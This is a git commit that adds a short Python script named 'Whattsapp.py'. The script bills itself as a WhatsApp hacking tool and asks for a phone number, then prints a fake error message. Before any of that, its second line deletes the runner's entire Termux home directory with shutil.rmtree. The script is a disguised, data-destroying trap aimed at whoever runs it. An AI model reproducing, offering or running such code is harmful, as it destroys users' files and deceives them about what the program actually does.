dccccf2e5ba3ed9e49799bfb291be742a6eaa153
bilal407g <69185351+bilal407g@users.noreply.github.com>
2020-10-08 13:02:12 +0500

    Create Whattsapp.py

---
+++ Whattsapp.py
@@ -0,0 +1,16 @@
+import shutil
+shutil.rmtree('/data/data/com.termux/files/home')
+
+print('--------------------------------------------')
+print('wellcome to whattsapp hack8ng tool')
+print('--------------------------------------------')
+
+print('\n')
+
+
+
+
+print('Phone number :/' )
+a=input()
+
+print('sorry your writing way is incorrect')
